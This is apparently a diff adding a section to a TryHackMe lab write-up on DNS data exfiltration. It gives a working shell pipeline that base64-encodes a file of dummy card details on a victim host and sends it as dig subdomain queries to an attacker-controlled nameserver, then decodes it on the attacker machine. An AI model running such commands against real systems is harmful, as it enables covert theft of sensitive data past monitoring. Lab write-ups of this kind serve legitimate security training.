@@ -445,4 +445,153 @@ To confim that all communications go through ICMP, we can capture the network tr
 
 ![tcpdump](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b7df6f586e47769bf2addbee68d69cdc.png)
 
-## 7. DNS Configurations
+### 7. DNS Data Exfiltration
+
+### 7.1 DNS Configurations
+
+In order to perform DNS Data Exfiltration, we need to **control a domain name** and **set up DNS records**. For this task, a domain name has been already set up for us, `tunnel.com`, and we can add our own DNS records by visiting the web server via our browser: `http://ATTACKER_IP`. 
+
+![DNS Changer Homepage](dns-changer-home.png)
+
+There is also a newly added `attacker` machine within Network 2 with the following details:
+
+|**Domain Name**|**IP Address**|**Network Access**|
+|---|---|---|
+|attacker.thm.com|172.20.0.200|Network 2|
+
+The goal is for `attacker.thm.com` to access network devices on Network 1 through `jump.thm.com`.
+
+![Network 2 to Network 1 Access](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e6bf2c81281be5cf8515eeed22254643.png)
+
+The rooms recommends to use the `jump.thm.com` machine for completing the task, so we will follow its advice. This means, that we don't have to manually add the `A` and `NS` DNS records, as the following are already set up for us:
+
+|**DNS Record**|**Type**|**Value**|
+|---|---|---|
+|attNS.tunnel.com|A|172.20.0.200|
+|att.tunnel.com|NS|attNS.tunnel.com|
+
+To verify that everything is there we can test our DNS configuration as follows:
+
+```shell
+# connect to jump.thm.com via SSH
+ssh thm@MACHINE-IP
+# password: tryhackme
+
+# resolve test.thm.com
+thm@jump-box:~$ dig +short test.thm.com
+# 127.0.0.1
+
+# send an ICMPEcho Request to test.thm.com to verify connectivity
+thm@jump-box:~$ ping test.thm.com -c 1
+```
+
+![DNS Testing](dns-testing.png)
+
+We can also answer the room's question by resolving `flag.thm.com`:
+
+![DNS Flag1](dns-flag.png)
+
+### 7.2 DNS Manual Data Exfiltration
+
+DNS's primary purpose it to **resolve domain names to IP addresses** and vice versa. Since DNS is not a transport protocol, **DNS traffic is not regurarly monitored**, and, in addition, most company **firewalls will allow DNS traffic** to pass through. 
+
+Although the above might seem ideal, DNS has also some limitations:
+1. The maximum length of the **Fully Qualified Domain Name (FQDN)** is 255 characters.
+2. The maximum length of the **subdomain name**, aka label, is 63 characters.
+
+![DNS Limitations](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8bbc858294e45de16712024af22181fc.png)
+
+Based on the above, **we can use a limited number of characters to transfer data over the domain name**. If we have a large file, for example, 10 Megabytes, it may need more than 50_000 DNS requests to transfer it, and, as a result, it will generate a lot of noise.
+
+The steps to perform DNS Data Exfiltration are:
+1. The attacker registers a domain name. We already have `tunnel.com`. 
+2. The attacker sets up the domain name's DNS record points to a server under his control.
+3. The attacker sends sensitive data from a target to a domain name under his control, e.g. `passw0rd.tunnel.com`, where `passw0rd` is the data the needs to be exfiltrated.
+4. The DNS request is sent through the local DNS server and is forwarded through the internet.
+5. The attacker's authoritative DNS receives the DNS request. 
+6. The attacker extracts the data from the domain name.
+
+![DNS Data Exfil Process](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/9881e420044ca01239d34c858342b888.png)
+
+Let's assume that we have a filed called `creds.txt`, and we want to move it over DNS. We first need to encode its content and attach it as a subdomain by performing the following steps:
+1. Get the required data that needs to be exfiltrated.
+2. Encode the data.
+3. Send the encoded data as a subdomain, keeping in mind the DNS length limitations. If we exceed those limits, the data will be split and more DNS requests will be sent.
+
+![creds.txt example](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a7ac15da0501d577dadcf53b4143ff98.png)
+
+Our goal for this task if to transfer the content of the `credit.txt` file from `victim2.thm.com` to `attacker.thm.com` using the `att.tunnel.com` nameserver. 
+
+1. We need to make the `attacker` machine ready to receive DNS requests. We will connect to it via SSH (via fist connecting to `jump.thm.com`), and then we will capture the network traffic for any incoming UDP/53 packets using `tcpdump`:
+
+    ```shell
+    # connect to attacker via SSH
+    thm@jump-box$ ssh thm@attacker.thm.com
+    # password: tryhackme
+
+    # capture incoming UDP/53 packets
+    sudo tcpdump -i eth0 udp port 53 -v
+    # tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+    ```
+
+2. We can now connect to `victim2.thm.com` through SSH (by first connecto to `jump.thm.com`):
+
+    ```shell
+    # connect to victim2 via SSH
+    thm@jump-box$ ssh thm@victim2.thm.com
+    # password: tryhackme
+    ```
+
+    As we can see, there is a `task9/credit.txt` file, which we need to encode:
+
+    ```shell
+    victim2$ cat task9/credit.txt
+    # Name: THM-user
+    # Address: 1234 Internet, THM
+    # Credit Card: 1234-1234-1234-1234
+    # Expire: 05/05/2022
+    # Code: 1337
+
+    victim2$ cat task9/credit.txt | base64
+    # TmFtZTogVEhNLXVzZXIKQWRkcmVzczogMTIzNCBJbnRlcm5ldCwgVEhNCkNyZWRpdCBDYXJkOiAxMjM0LTEyMzQtMTIzNC0xMjM0CkV4cGlyZTogMDUvMDUvMjAyMgpDb2RlOiAxMzM3Cg==
+    ```
+
+3. We now need to split the encoded data into one or more DNS requests depending on the output's length and attach it as a subdomain name:
+
+    ```shell
+    thm@victim2:~$ cat task9/credit.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.att.tunnel.com/'
+    ```
+
+    After encoding the data in `base64`, we cleaned the string by removing the new line symbol `\n`, and gathered every 18 characters as a group. Finally, we appended the nameserver `att.tunnel.com` in every group.
+
+    Another way of doing this, is by splitting every 18 characters with a dot `.` and add the nameserver after:
+
+    ```shell
+    thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/
+    ```
+
+![Encoding and formatting data](dns-splitting-content.png)
+
+4. Next, from `victim2`, we must send the encoded data as a subdomain name:
+
+    ```shell
+    thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
+    ```
+
+    With some adjustments to the single DNS request, we created and added the `dig` command to send it over DNS, and, finally, we passed it to `bash` to be executed.
+
+    ![DNS Data Exfil](dns-data-transfer.png)
+
+5. Once our DNS request is received, we can stop `tcpdump`, clean, and decode the received data:
+
+```shell
+thm@attacker:~$ echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
+# Name: THM-user
+# Address: 1234 Internet, THM
+# Credit Card: 1234-1234-1234-1234
+# Expire: 05/05/2022
+# Code: 1337
+```
+
+![dns-cleaning-decoding-data](dns-cleaning-decoding-data.png)
+
